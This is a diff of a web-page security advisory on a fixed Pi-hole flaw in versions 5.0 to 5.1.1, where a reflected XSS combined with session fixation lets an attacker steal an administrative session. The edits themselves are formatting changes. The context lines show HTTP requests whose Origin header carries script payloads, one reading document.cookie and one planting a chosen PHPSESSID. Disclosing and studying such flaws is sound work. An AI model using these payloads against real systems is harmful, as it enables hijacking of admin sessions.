@@ -130,16 +130,15 @@ Product Information  Product Name: Pi-hole Vulnerable Version: 5.0, 5.1, 5.1.1 O
 <li><strong>Vulnerable Version:</strong> 5.0, 5.1, 5.1.1</li>
 <li><strong>Organization Name:</strong> Pi-hole, LLC</li>
 <li><strong>Product Web Page:</strong> <a href="https://pi-hole.net/">https://pi-hole.net/</a></li>
-<li><strong>eMail:</strong> <a href="disclosure@pi-hole.net">disclosure@pi-hole.net</a></li>
+<li><strong>Email:</strong> <a href="disclosure@pi-hole.net">disclosure@pi-hole.net</a></li>
 <li><strong>Vulnerability Disclosure Info Web Page:</strong> <a href="https://pi-hole.net/contact/">https://pi-hole.net/contact/</a></li>
 </ul>
 
 <p>Pi-hole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network.<br />
 During a security auditing of the product, I have found two issues. The first is a Reflected XSS, the second is a Session Fixation. Those issues can be combined to steal a valid administrative session.</p>
 
-<p>The fixes were implemented by the owners after my vulnerability notification.</p>
-
-<p>It is recommended to apply the latest update Pi-hole FTL v5.7 and Web v5.4: <a href="https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/#page-content">https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/#page-content</a></p>
+<p>The fixes were implemented by the owners after my vulnerability notification.<br />
+It is recommended to apply the latest update Pi-hole FTL v5.7 and Web v5.4: <a href="https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/">https://pi-hole.net/2021/02/16/pi-hole-ftl-v5-7-and-web-v5-4-released/</a></p>
 
 <h2 id="vulnerability-details">Vulnerability Details</h2>
 
@@ -176,7 +175,6 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 Origin: aaa&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-
 
 </code></pre>
 
@@ -232,7 +230,6 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 Origin: aaa&lt;script&gt;document.cookie = &quot;PHPSESSID&quot;+&quot;=&quot;+escape(&quot;mosmbqsp3lh7pf1ar2djcjmk5v&quot;)&lt;/script&gt;
 Cookie: PHPSESSID=mosmbqsp3lh7pf1ar2djcjmk5v
-
 
 </code></pre>
 
